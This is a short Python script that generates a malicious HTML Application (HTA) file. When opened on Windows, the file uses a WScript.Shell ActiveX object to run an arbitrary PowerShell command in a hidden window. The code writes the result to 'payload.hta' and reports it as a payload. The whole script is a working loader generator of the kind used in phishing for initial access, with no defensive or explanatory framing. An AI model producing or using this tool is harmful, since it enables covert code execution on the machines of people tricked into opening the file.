import argparse

def generate_hta(ps_command: str) -> str:
    return f"""
<html>
<head>
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -WindowStyle Hidden -Command {ps_command}");
</script>
</head>
<body></body>
</html>
"""

def main():
    parser = argparse.ArgumentParser(description="Generate HTA loader with embedded PowerShell command")
    parser.add_argument("command", help="PowerShell command to embed in the HTA")
    parser.add_argument("-o", "--output", default="payload.hta", help="Output HTA filename (default: payload.hta)")
    args = parser.parse_args()

    hta_content = generate_hta(args.command)
    with open(args.output, "w") as f:
        f.write(hta_content)
    print(f"[+] HTA payload generated and saved to {args.output}")

if __name__ == "__main__":
    main()

